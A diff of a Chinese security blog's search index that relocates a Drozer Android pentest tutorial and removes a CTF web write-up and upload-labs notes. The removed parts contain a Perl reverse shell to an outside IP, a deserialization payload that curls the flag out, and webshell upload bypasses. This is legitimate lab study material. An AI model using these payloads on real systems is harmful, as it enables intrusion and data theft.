@@ -133,68 +133,6 @@ POST key=password4&amp;password=tyao</code></pre><h2 id="rceme"><a href="#rceme"
       </tags>
   </entry>
   <entry>
-    <title>Drozer 入门</title>
-    <url>/2020/03/25/Drozer-%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<p>Drozer 工具入门</p>
-<a id="more"></a>
-
-<h2 id="Drozer-安卓渗透"><a href="#Drozer-安卓渗透" class="headerlink" title="Drozer 安卓渗透"></a>Drozer 安卓渗透</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>win10 + Python2.7</p>
-<h3 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h3><p><a href="https://www.yeshen.com/cn/download/fullPackage" target="_blank" rel="noopener">夜神模拟器</a></p>
-<h3 id="安装-Drozer"><a href="#安装-Drozer" class="headerlink" title="安装 Drozer"></a>安装 Drozer</h3><p><a href="https://labs.f-secure.com/tools/drozer/" target="_blank" rel="noopener">下载Drozer</a></p>
-<p><a href="https://adbshell.com/downloads" target="_blank" rel="noopener">下载adb</a></p>
-<p><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">下载apktool</a></p>
-<p><a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener">下载dex2jar</a></p>
-<p><a href="https://github.com/java-decompiler/jd-gui/releases" target="_blank" rel="noopener">下载jd-gui</a></p>
-<h3 id="模拟器安装-Drozer"><a href="#模拟器安装-Drozer" class="headerlink" title="模拟器安装 Drozer"></a>模拟器安装 Drozer</h3><p>直接把下载的 agent.apk 拖到模拟器开启就行</p>
-<p><img src="https://i.loli.net/2020/03/25/q5lbu8ojfRL2GkY.png" alt="image-20200325151151218.png"></p>
-<h3 id="本地开启-Drozer"><a href="#本地开启-Drozer" class="headerlink" title="本地开启 Drozer"></a>本地开启 Drozer</h3><h4 id="连接模拟器端口"><a href="#连接模拟器端口" class="headerlink" title="连接模拟器端口"></a>连接模拟器端口</h4><p>这里的62001是夜神模拟器使用的端口</p>
-<pre><code>adb connect 127.0.0.1:62001</code></pre><p>其他模拟器端口参考如下</p>
-<table>
-<thead>
-<tr>
-<th>模拟器名称</th>
-<th>连接默认端口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>夜神安卓模拟器</td>
-<td>62001</td>
-</tr>
-<tr>
-<td>逍遥安卓模拟器</td>
-<td>21503</td>
-</tr>
-<tr>
-<td>BlueStacks(蓝叠安卓模拟器)</td>
-<td>5555</td>
-</tr>
-<tr>
-<td>雷电安卓模拟器</td>
-<td>5555</td>
-</tr>
-<tr>
-<td>天天安卓模拟器</td>
-<td>6555</td>
-</tr>
-<tr>
-<td>网易MuMu(安卓模拟器)</td>
-<td>7555</td>
-</tr>
-<tr>
-<td>安卓模拟器大师</td>
-<td>54001</td>
-</tr>
-</tbody></table>
-<h4 id="查看连接连接状态"><a href="#查看连接连接状态" class="headerlink" title="查看连接连接状态"></a>查看连接连接状态</h4><pre><code>adb devices</code></pre><h4 id="进入安卓-shell"><a href="#进入安卓-shell" class="headerlink" title="进入安卓 shell"></a>进入安卓 shell</h4><pre><code>adb shell</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>把安卓的41415端口转发到本机的41415端口</p>
-<pre><code>adb forward tcp:31415 tcp:31415</code></pre><h4 id="连接-Drozer"><a href="#连接-Drozer" class="headerlink" title="连接 Drozer"></a>连接 Drozer</h4><pre><code>drozer console connect</code></pre><p><img src="https://i.loli.net/2020/03/25/B91X6Ld3pc7sy4u.png" alt="image-20200325151823660.png"></p>
-<h3 id="Drozer-测试步骤"><a href="#Drozer-测试步骤" class="headerlink" title="Drozer 测试步骤"></a>Drozer 测试步骤</h3><h4 id="获取包名"><a href="#获取包名" class="headerlink" title="获取包名"></a>获取包名</h4><p>-f 后面跟 apk 的名字，这里以 sieve.apk 为例子</p>
-<pre><code>run app.package.list -f sieve</code></pre><h4 id="获取包的基本信息"><a href="#获取包的基本信息" class="headerlink" title="获取包的基本信息"></a>获取包的基本信息</h4><pre><code>run app.package.info -a com.mwr.example.sieve</code></pre><h4 id="确定攻击面"><a href="#确定攻击面" class="headerlink" title="确定攻击面"></a>确定攻击面</h4><pre><code>run app.package.attacksurface com.mwr.example.sieve</code></pre><h4 id="Acitivity"><a href="#Acitivity" class="headerlink" title="Acitivity"></a>Acitivity</h4><h5 id="获取-Activity-信息"><a href="#获取-Activity-信息" class="headerlink" title="获取 Activity 信息"></a>获取 Activity 信息</h5><pre><code>run app.activity.info -a com.mwr.example.sieve</code></pre><h5 id="启动-activity"><a href="#启动-activity" class="headerlink" title="启动 activity"></a>启动 activity</h5><pre><code>run app.activity.start --component com.mwr.example.sieve 活动名称</code></pre><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><h5 id="获取-Content-Provider-信息"><a href="#获取-Content-Provider-信息" class="headerlink" title="获取 Content Provider 信息"></a>获取 Content Provider 信息</h5><pre><code>run app.provider.info -a com.mwr.example.sieve</code></pre><h5 id="检测目录遍历漏洞"><a href="#检测目录遍历漏洞" class="headerlink" title="检测目录遍历漏洞"></a>检测目录遍历漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="检测-SQL-注入漏洞"><a href="#检测-SQL-注入漏洞" class="headerlink" title="检测 SQL 注入漏洞"></a>检测 SQL 注入漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h5><p>爆破 uri</p>
-<pre><code>run scanner.provider.finduris -a com.mwr.example.sieve</code></pre><p>查询 uri</p>
-<pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</code></pre><h5 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h5><pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;</code></pre><h5 id="系统文件访问"><a href="#系统文件访问" class="headerlink" title="系统文件访问"></a>系统文件访问</h5><pre><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code></pre><h5 id="系统文件下载"><a href="#系统文件下载" class="headerlink" title="系统文件下载"></a>系统文件下载</h5><pre><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db</code></pre><h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><h5 id="获取-Broadacast-信息"><a href="#获取-Broadacast-信息" class="headerlink" title="获取 Broadacast 信息"></a>获取 Broadacast 信息</h5><pre><code>run app.broadcast.info -a com.icenta.sudoku.ui</code></pre><h5 id="空-action-攻击"><a href="#空-action-攻击" class="headerlink" title="空 action 攻击"></a>空 action 攻击</h5><pre><code>run app.broadcast.send --component com.icenta.sudoku.ui com.heyzap.sdk.ads.PackageAddedReceiver</code></pre><h5 id="空-extras-攻击"><a href="#空-extras-攻击" class="headerlink" title="空 extras 攻击"></a>空 extras 攻击</h5><p>这里的 action 需要查看反编译的 AndroidManifest.xml 文件，找出 receiver 对应 的 action</p>
-<p><img src="https://i.loli.net/2020/03/25/f3G4uYmxsiaUZgK.png" alt="image-20200325164738846.png"></p>
-<pre><code>run app.broadcast.send --action android.intent.action.PACKAGE_ADDED</code></pre><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><h5 id="获取-Service-信息"><a href="#获取-Service-信息" class="headerlink" title="获取 Service 信息"></a>获取 Service 信息</h5><pre><code>run app.service.info -a com.mwr.example.sieve</code></pre><h5 id="权限提升（未试验）"><a href="#权限提升（未试验）" class="headerlink" title="权限提升（未试验）"></a>权限提升（未试验）</h5><pre><code>run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 1 --extra string text 1 --extra string OP SEND_SMS</code></pre>]]></content>
-  </entry>
-  <entry>
     <title>Login-py反编译</title>
     <url>/2021/03/27/Login-py%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
     <content><![CDATA[<blockquote>
@@ -309,6 +247,68 @@ print(&#39;[+] flag:&#39;, hashlib.md5(&#39;&#39;.join([chr(_) for _ in flag]).e
       <tags>
         <tag>Study</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Drozer 入门</title>
+    <url>/2020/03/25/Drozer-%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<p>Drozer 工具入门</p>
+<a id="more"></a>
+
+<h2 id="Drozer-安卓渗透"><a href="#Drozer-安卓渗透" class="headerlink" title="Drozer 安卓渗透"></a>Drozer 安卓渗透</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>win10 + Python2.7</p>
+<h3 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h3><p><a href="https://www.yeshen.com/cn/download/fullPackage" target="_blank" rel="noopener">夜神模拟器</a></p>
+<h3 id="安装-Drozer"><a href="#安装-Drozer" class="headerlink" title="安装 Drozer"></a>安装 Drozer</h3><p><a href="https://labs.f-secure.com/tools/drozer/" target="_blank" rel="noopener">下载Drozer</a></p>
+<p><a href="https://adbshell.com/downloads" target="_blank" rel="noopener">下载adb</a></p>
+<p><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">下载apktool</a></p>
+<p><a href="https://sourceforge.net/projects/dex2jar/" target="_blank" rel="noopener">下载dex2jar</a></p>
+<p><a href="https://github.com/java-decompiler/jd-gui/releases" target="_blank" rel="noopener">下载jd-gui</a></p>
+<h3 id="模拟器安装-Drozer"><a href="#模拟器安装-Drozer" class="headerlink" title="模拟器安装 Drozer"></a>模拟器安装 Drozer</h3><p>直接把下载的 agent.apk 拖到模拟器开启就行</p>
+<p><img src="https://i.loli.net/2020/03/25/q5lbu8ojfRL2GkY.png" alt="image-20200325151151218.png"></p>
+<h3 id="本地开启-Drozer"><a href="#本地开启-Drozer" class="headerlink" title="本地开启 Drozer"></a>本地开启 Drozer</h3><h4 id="连接模拟器端口"><a href="#连接模拟器端口" class="headerlink" title="连接模拟器端口"></a>连接模拟器端口</h4><p>这里的62001是夜神模拟器使用的端口</p>
+<pre><code>adb connect 127.0.0.1:62001</code></pre><p>其他模拟器端口参考如下</p>
+<table>
+<thead>
+<tr>
+<th>模拟器名称</th>
+<th>连接默认端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>夜神安卓模拟器</td>
+<td>62001</td>
+</tr>
+<tr>
+<td>逍遥安卓模拟器</td>
+<td>21503</td>
+</tr>
+<tr>
+<td>BlueStacks(蓝叠安卓模拟器)</td>
+<td>5555</td>
+</tr>
+<tr>
+<td>雷电安卓模拟器</td>
+<td>5555</td>
+</tr>
+<tr>
+<td>天天安卓模拟器</td>
+<td>6555</td>
+</tr>
+<tr>
+<td>网易MuMu(安卓模拟器)</td>
+<td>7555</td>
+</tr>
+<tr>
+<td>安卓模拟器大师</td>
+<td>54001</td>
+</tr>
+</tbody></table>
+<h4 id="查看连接连接状态"><a href="#查看连接连接状态" class="headerlink" title="查看连接连接状态"></a>查看连接连接状态</h4><pre><code>adb devices</code></pre><h4 id="进入安卓-shell"><a href="#进入安卓-shell" class="headerlink" title="进入安卓 shell"></a>进入安卓 shell</h4><pre><code>adb shell</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>把安卓的41415端口转发到本机的41415端口</p>
+<pre><code>adb forward tcp:31415 tcp:31415</code></pre><h4 id="连接-Drozer"><a href="#连接-Drozer" class="headerlink" title="连接 Drozer"></a>连接 Drozer</h4><pre><code>drozer console connect</code></pre><p><img src="https://i.loli.net/2020/03/25/B91X6Ld3pc7sy4u.png" alt="image-20200325151823660.png"></p>
+<h3 id="Drozer-测试步骤"><a href="#Drozer-测试步骤" class="headerlink" title="Drozer 测试步骤"></a>Drozer 测试步骤</h3><h4 id="获取包名"><a href="#获取包名" class="headerlink" title="获取包名"></a>获取包名</h4><p>-f 后面跟 apk 的名字，这里以 sieve.apk 为例子</p>
+<pre><code>run app.package.list -f sieve</code></pre><h4 id="获取包的基本信息"><a href="#获取包的基本信息" class="headerlink" title="获取包的基本信息"></a>获取包的基本信息</h4><pre><code>run app.package.info -a com.mwr.example.sieve</code></pre><h4 id="确定攻击面"><a href="#确定攻击面" class="headerlink" title="确定攻击面"></a>确定攻击面</h4><pre><code>run app.package.attacksurface com.mwr.example.sieve</code></pre><h4 id="Acitivity"><a href="#Acitivity" class="headerlink" title="Acitivity"></a>Acitivity</h4><h5 id="获取-Activity-信息"><a href="#获取-Activity-信息" class="headerlink" title="获取 Activity 信息"></a>获取 Activity 信息</h5><pre><code>run app.activity.info -a com.mwr.example.sieve</code></pre><h5 id="启动-activity"><a href="#启动-activity" class="headerlink" title="启动 activity"></a>启动 activity</h5><pre><code>run app.activity.start --component com.mwr.example.sieve 活动名称</code></pre><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><h5 id="获取-Content-Provider-信息"><a href="#获取-Content-Provider-信息" class="headerlink" title="获取 Content Provider 信息"></a>获取 Content Provider 信息</h5><pre><code>run app.provider.info -a com.mwr.example.sieve</code></pre><h5 id="检测目录遍历漏洞"><a href="#检测目录遍历漏洞" class="headerlink" title="检测目录遍历漏洞"></a>检测目录遍历漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="检测-SQL-注入漏洞"><a href="#检测-SQL-注入漏洞" class="headerlink" title="检测 SQL 注入漏洞"></a>检测 SQL 注入漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h5><p>爆破 uri</p>
+<pre><code>run scanner.provider.finduris -a com.mwr.example.sieve</code></pre><p>查询 uri</p>
+<pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</code></pre><h5 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h5><pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;</code></pre><h5 id="系统文件访问"><a href="#系统文件访问" class="headerlink" title="系统文件访问"></a>系统文件访问</h5><pre><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code></pre><h5 id="系统文件下载"><a href="#系统文件下载" class="headerlink" title="系统文件下载"></a>系统文件下载</h5><pre><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db</code></pre><h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><h5 id="获取-Broadacast-信息"><a href="#获取-Broadacast-信息" class="headerlink" title="获取 Broadacast 信息"></a>获取 Broadacast 信息</h5><pre><code>run app.broadcast.info -a com.icenta.sudoku.ui</code></pre><h5 id="空-action-攻击"><a href="#空-action-攻击" class="headerlink" title="空 action 攻击"></a>空 action 攻击</h5><pre><code>run app.broadcast.send --component com.icenta.sudoku.ui com.heyzap.sdk.ads.PackageAddedReceiver</code></pre><h5 id="空-extras-攻击"><a href="#空-extras-攻击" class="headerlink" title="空 extras 攻击"></a>空 extras 攻击</h5><p>这里的 action 需要查看反编译的 AndroidManifest.xml 文件，找出 receiver 对应 的 action</p>
+<p><img src="https://i.loli.net/2020/03/25/f3G4uYmxsiaUZgK.png" alt="image-20200325164738846.png"></p>
+<pre><code>run app.broadcast.send --action android.intent.action.PACKAGE_ADDED</code></pre><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><h5 id="获取-Service-信息"><a href="#获取-Service-信息" class="headerlink" title="获取 Service 信息"></a>获取 Service 信息</h5><pre><code>run app.service.info -a com.mwr.example.sieve</code></pre><h5 id="权限提升（未试验）"><a href="#权限提升（未试验）" class="headerlink" title="权限提升（未试验）"></a>权限提升（未试验）</h5><pre><code>run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 1 --extra string text 1 --extra string OP SEND_SMS</code></pre>]]></content>
   </entry>
   <entry>
     <title>Reverse中Unity的逆向</title>
@@ -479,556 +479,6 @@ adb pull /data/data/com.example.how_debug/00125-02.dex ./</code></pre>
 ]]></content>
       <tags>
         <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2020 V&amp;N CTF Web</title>
-    <url>/2020/03/01/%C2%96%C2%962020-V-N-CTF-Web/</url>
-    <content><![CDATA[<p>有很多地方没有转过来，思维过于僵硬，感谢赵师傅出的精美题目</p>
-<a id="more"></a>
-
-<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>CTFd 的漏洞</p>
-<p>简单来说来说就是注册带空格恶意用户名然后忘记密码进行修改</p>
-<p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p>
-<h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>找了亿个反弹 shell，下面是有用的一个</p>
-<blockquote>
-<p><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
-<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-</blockquote>
-<pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.216.98:9000&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p>系统没有 losf、ps 等进程命令，所以自己逐个去 /proc 找</p>
-<pre><code>app@362cb9dcadd1:/proc$ cd 10
-app@362cb9dcadd1:/proc/10$ cd fd
-app@362cb9dcadd1:/proc/10/fd$ ls -al
-total 0
-dr-x------ 2 app app  0 Feb 29 05:47 .
-dr-xr-xr-x 9 app app  0 Feb 29 05:43 ..
-lrwx------ 1 app app 64 Feb 29 05:47 0 -&gt; /dev/null
-l-wx------ 1 app app 64 Feb 29 05:47 1 -&gt; &#39;pipe:[421276576]&#39;
-l-wx------ 1 app app 64 Feb 29 05:47 2 -&gt; &#39;pipe:[421276577]&#39;
-lr-x------ 1 app app 64 Feb 29 05:47 3 -&gt; &#39;/home/app/flag.txt (deleted)&#39;
-lrwx------ 1 app app 64 Feb 29 05:47 4 -&gt; &#39;socket:[421292108]&#39;
-app@362cb9dcadd1:/proc/10/fd$ cat 3
-flag{85693908-b5aa-4f03-96a8-133fc30854d3}</code></pre><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>phpinfo 没有读到有用的信息</p>
-<p>读 composer.json 文件根据组件查找 CVE</p>
-<pre><code>{
-    &quot;require&quot;:{
-        &quot;guzzlehttp/guzzle&quot;:&quot;6.2.0&quot;
-    }</code></pre><p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">https://www.laruence.com/2016/07/19/3101.html</a></p>
-<p>开一台内网主机</p>
-<pre><code># index.php
-&lt;?php
-        $arr = array(&quot;success&quot;=&gt;true);
-        header(&quot;Content-Type:application/json&quot;);
-        echo json_encode($arr);
-# 执行 php -S 0:9999</code></pre><pre><code>Proxy: http://174.0.216.98:9999</code></pre><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>javaweb 的题目</p>
-<p>这里用 Tools 类生成 cookies，而 Tools 类继承序列化类，所以 cookies 有反序列化操作</p>
-<pre><code class="java">// springmvcdemo.war!\WEB-INF\classes\com\filters\ClentInfoFilter.class
-String b64 = cookie.getValue();
-      Base64.Decoder decoder = Base64.getDecoder();
-      byte[] bytes = decoder.decode(b64);
-      ClientInfo cinfo = null;
-      if ((b64.equals(&quot;&quot;)) || (bytes == null))
-      {
-        cinfo = new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId());
-        Base64.Encoder encoder = Base64.getEncoder();
-        try
-        {
-          bytes = Tools.create(cinfo);
-        }
-        catch (Exception e)
-        {
-          e.printStackTrace();
-        }
-        cookie.setValue(encoder.encodeToString(bytes));</code></pre>
-<p>PictureController.class 存在文件上传和文件包含，需要伪造成 admin，webmanager，我们直接在任意一个 jsp 页面运行以下代码覆盖原 cookies 就可以拿去文件上传了。</p>
-<pre><code class="jsp">&lt;%
-    ClientInfo cinfo = new ClientInfo(&quot;admin&quot;, &quot;webmanager&quot;, ((HttpServletRequest)request).getRequestedSessionId());
-    byte[] bytes = Tools.create(cinfo);
-    cookie = new Cookie(&quot;cinfo&quot;, encoder.encodeToString(bytes));
-    cookie.setMaxAge(86400);
-    ((HttpServletResponse)response).addCookie(cookie);
-    ((HttpServletRequest)request).getSession().setAttribute(&quot;cinfo&quot;, cinfo);
-%&gt;</code></pre>
-<p>但是文件上传只能通过修改文件名存储到 /tmp 目录，jsp 文件包含除了 jpg 和 gif 只能取到文件名，所以此处文件包含是不可取了。赛后看了其他大哥的博客，原来是 <code>ProcessBuilder</code>漏洞。</p>
-<pre><code class="java">  // springmvcdemo.war!\WEB-INF\classes\com\tools\Tools.class
-  private void readObject(ObjectInputStream in)
-    throws IOException, ClassNotFoundException
-  {
-    Object obj = in.readObject();
-    new ProcessBuilder((String[])obj).start();
-  }</code></pre>
-<p>这里我们可以通过重写<code>writeObject</code>方法来实现，来构造一个字符串传给<code>ProcessBuilder</code>执行命令</p>
-<pre><code class="java">private void writeObject(ObjectOutputStream out) throws IOException {
-        String[] cmd = {&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;curl http://174.0.218.99:9000/`/readflag`&quot;};
-        out.writeObject(cmd);
-}</code></pre>
-<p>在 Tools 类里加上上面的函数，然后生成序列化的 cookies，带上去另一边监听即可得到 flag</p>
-<pre><code class="java">import java.io.*;
-import java.util.Base64;
-import com.tools.*;
-public class exp {
-    public static void main(String[] args) {
-        Base64.Encoder encoder = Base64.getEncoder();
-        try {
-            Tools cinfo = new Tools();
-            byte[] bytes = Tools.create(cinfo);
-            String payload = encoder.encodeToString(bytes);
-            System.out.println(payload);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-    }
-}</code></pre>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>upload-labs</title>
-    <url>/2020/02/28/upload-labs/</url>
-    <content><![CDATA[<blockquote>
-<p>之前的一些关于 upload-labs 的练习</p>
-</blockquote>
-<a id="more"></a>
-
-<h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>修改后缀名</p>
-<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>Content-type 改为 image/gif</p>
-<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><ol>
-<li><p>改后缀名  <code>php2, php3, php4, php5, phps, pht, phtm, phtml</code></p>
-</li>
-<li><p>重写文件解析规则绕过。上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p>
-</li>
-</ol>
-<pre><code>&lt;FilesMatch &quot;03.jpg&quot;&gt;
-SetHandler application/x-httpd-php
-&lt;/FilesMatch&gt;</code></pre><p>然后再上传一个<code>03.jpg</code></p>
-<p>执行上传的<code>03.jpg</code>脚本</p>
-<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>查看源代码 发现黑名单几乎过滤了全部的违法后缀名 ，<strong>但少过滤了 .htaccess 后缀</strong></p>
-<ol>
-<li>上传一个.htaccess 文件 重写 服务器的文件解析  </li>
-</ol>
-<p>创建一个 .htaccess 文件</p>
-<p>内容可以是 : AddType application/x-httpd-php .jpg,可将jpg文件解析为php文件.</p>
-<p>或者是 : SetHandler application/x-httpd-php,可将其他所有文件解析为php文件.</p>
-<ol start="2">
-<li>利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：</li>
-</ol>
-<pre><code>双引号&quot;     =   点号.
-大于符号&gt;   =   问号?
-小于符号&lt;   =   星号*</code></pre><p>先把4.php文件后缀改为4.jpg  然后用bs 将文件名改为 4.php:.jpg，上传成功后会生成4.php的空文件，大小为0KB.</p>
-<p>然后再在bs 中把文件名 改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容，Webshell代码就会写入原来的4.php空文件中。</p>
-<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>查看源代码发现 黑名单里加上了 .htaccess 后缀 ，但是没有 进行大小写过滤</p>
-<p>与 Pass-04 一样</p>
-<h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>在 pass-05 的基础上加上了大小写过滤， 但发现去掉了收尾去空</p>
-<p>查了一下：<code>trim()</code>函数 : <code>移除字符串两侧的空白字符或其他预定义字符</code>.</p>
-<p>Win下<code>xx.jpg[空格] 或xx.jpg.</code>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点**</p>
-<p>用 bs 在1.php 后缀名后面加一个空格成功绕过</p>
-<h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>没有删除文件后缀名的点</p>
-<h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>查看源代码后发现 黑名单过滤 没有去字符串 ::$DATA </p>
-<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。<br>上传<code>.php::$DATA</code>绕过。(仅限windows)  上传后 自动保存为 1.php</p>
-<h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code></p>
-<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>双写文件名绕过，文件名改成<code>10.pphphp</code></p>
-<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>上传路径名%00截断绕过。上传的文件名写成<code>11.jpg</code>, save_path改成<code>../upload/11.php%00</code>，最后保存下来的文件就是<code>11.php</code></p>
-<p>但这东西有点过气了，因为需要两个条件</p>
-<ol>
-<li>php版本小于5.3.4</li>
-<li>php的<strong>magic_quotes_gpc</strong>为OFF状态</li>
-</ol>
-<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>php.ini设置 <code>magic_quotes_gpc = Off</code></p>
-<p>POST 不能解析 url 编码，所以可以用 0x00</p>
-<p>原理同<strong>Pass-11</strong>，上传路径0x00绕过。利用Burpsuite的Hex功能将save_path改成<code>../upload/12.php【二进制00】</code>形式</p>
-<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码通过读取上传文件的<strong>前两字节判断是否为图片</strong></p>
-<pre><code> $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin); </code></pre><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p>
-<p>使用命令<code>copy normal.jpg /b + shell.php /a webshell.jpg</code>，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg" target="_blank" rel="noopener">JPG一句话shell参考示例</a></p>
-<p>png图片处理方式同上。<a href="https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png" target="_blank" rel="noopener">PNG一句话shell参考示例</a></p>
-<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><code>getimagesize</code>通过检查图像文件的大小并返回图像的尺寸以及文件类型</p>
-<pre><code>list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</code></pre><p><code>image_type_to_extension</code>根据指定的图像类型返回对应的后缀名</p>
-<p>原理和示例同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
-<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><pre><code>$image_type = exif_imagetype($filename);</code></pre><p><img src="C:%5CUsers%5CIrving%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564977362026.png" alt="1564977362026"></p>
-<p>原理同<strong>Pass-13</strong>，添加GIF图片的文件头绕过检查</p>
-<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p>
